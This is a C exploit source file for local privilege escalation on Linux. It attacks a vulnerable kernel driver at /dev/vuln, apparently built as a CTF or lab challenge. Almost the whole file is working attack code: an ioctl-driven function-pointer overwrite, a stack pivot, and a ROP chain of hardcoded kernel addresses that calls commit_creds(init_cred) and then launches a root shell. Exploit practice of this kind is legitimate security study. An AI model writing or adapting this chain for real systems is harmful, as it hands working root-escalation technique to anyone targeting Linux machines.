#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <assert.h>
#include <string.h>
#include <sched.h>
#include <signal.h>
#include <keyutils.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include "libexp.h"

#ifndef va_start
#include <stdarg.h>
#endif

// define commands
#define IOCTL_BASE 'W'
#define CMD_ALLOC   _IO(IOCTL_BASE, 0)
#define CMD_WRITE   _IO(IOCTL_BASE, 1)
#define CMD_CALL	_IO(IOCTL_BASE, 2)

int fd;
int cmd_call = CMD_CALL;
int done = 0;
int *ptr = &done;

void kmalloc()
{
	int ret = ioctl(fd, CMD_ALLOC, NULL);
	assert(ret == 0);
}

void do_write(void *buf)
{
	int ret = ioctl(fd, CMD_WRITE, (unsigned long)buf);
	assert(ret == 0);
}

void shell()
{
	printf("uid: %d\n", getuid());
	printf("done: %d\n", done);
	system("/bin/bash");
}

void trigger()
{
    unsigned long chain[0x10];
    int idx = 0;
    memset(chain, 0, sizeof(chain));

	// krand payload
    chain[idx++] = 0xffffffff81000c6b;//: ret;
    chain[idx++] = 0xffffffff81000c6b;//: ret;
    chain[idx++] = 0xffffffff81000c6b;//: ret;
    chain[idx++] = 0xffffffff81000c6b;//: ret;
    chain[idx++] = 0xffffffff81000c69;//: pop rdi; pop rbp; ret;
    chain[idx++] = 0xffffffff826509a0;// init cred

    chain[idx++] = 0;
    chain[idx++] = 0xffffffff810902a0;// commit_creds
    chain[idx++] = 0xffffffff81e000f5;// trampoline
    chain[idx++] = 0xffffffff8109cfc0;// do_task_dead
    chain[idx++] = 0xffffffff8109cfc0;// do_task_dead
    chain[idx++] = 0xffffffff8109cfc0;// do_task_dead
    chain[idx++] = 0xffffffff8109cfc0;// do_task_dead
    chain[idx++] = 0xffffffff8109cfc0;// do_task_dead
    chain[idx++] = 0xffffffff8109cfc0;// do_task_dead
    chain[idx++] = 0xffffffff8109cfc0;// do_task_dead

    // chain[idx++] = 0xffffffff819b5ff0;//  pop rcx; pop rbp; ret
    // chain[idx++] = (u64)shell;
    // chain[idx++] = 0;
					  //
	chain[14] = fd;
	chain[13] = CMD_CALL;

            //"mov rsp, 0xffffffff8109cfc0;"
    __asm__(".intel_syntax noprefix;"  \
            "mov rcx, %0;"          \
            "mov r15, [rcx+8*0];"    \
            "mov r14, [rcx+8*1];"    \
            "mov r13, [rcx+8*2];"    \
            "mov r12, [rcx+8*3];"    \
            "mov rbp, [rcx+8*4];"    \
            "mov rbx, [rcx+8*5];"    \
            "mov r11, [rcx+8*6];"    \
            "mov r10, [rcx+8*7];"    \
            "mov r9 , [rcx+8*8];"    \
            "mov r8 , [rcx+8*9];"    \
            "nop;"                  \
            "nop;"                    \
            "mov rdx, [rcx+8*12];"  \
            "mov rsi, [rcx+8*13];"  \
            "mov rdi, [rcx+8*14];"  \
            "nop;"                  \
            "nop;"                  \
            "mov rax, 16;"          \
            "syscall;"  \
            ".att_syntax;"          \
            : : "r"(chain));

}

void clear_stack(void *addr)
{
	syscall(__NR_adjtimex, addr);
}

void *pthread_func(void *)
{
	// puts("thread!");
	// trigger(fd, CMD_CALL);
	// ioctl(fd, CMD_CALL);
	pthread_exit(0);
	// sleep(10000);
	// pthread_exit(0);
}

void sig_handler(int sig_num)
{
	printf("sig_num: %d\n", sig_num);
	// pthread_exit(0);
	// sleep(100000);
	printf("uid in sig_handler: %d\n", getuid());
	if(getuid() == 0) {
		system("/bin/bash");
	}
}

int main()
{
	setbuf(stdout, NULL);
	signal(SIGSEGV, sig_handler);
	signal(SIGTRAP, sig_handler);
	printf("pid: %d\n", getpid());

	// do exploitation
	long func_ptr;
	fd = open("/dev/vuln", O_RDWR);
	assert(fd >= 0);

	kmalloc();

	// func_ptr = 0xffffffff810270cf; //0x70: add rsp, 0x70; ret;
	// func_ptr = 0xffffffff8107c490; //: add rsp, 0x88; ret;
	func_ptr = 0xffffffff81a4614e;// : add rsp, 0xb8; ret;
	do_write(&func_ptr);

	void *addr = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE, -1, 0);
	for(int i=0; i<400; i++) clear_stack(addr+0x1000-0xd0+1);
	trigger();
}
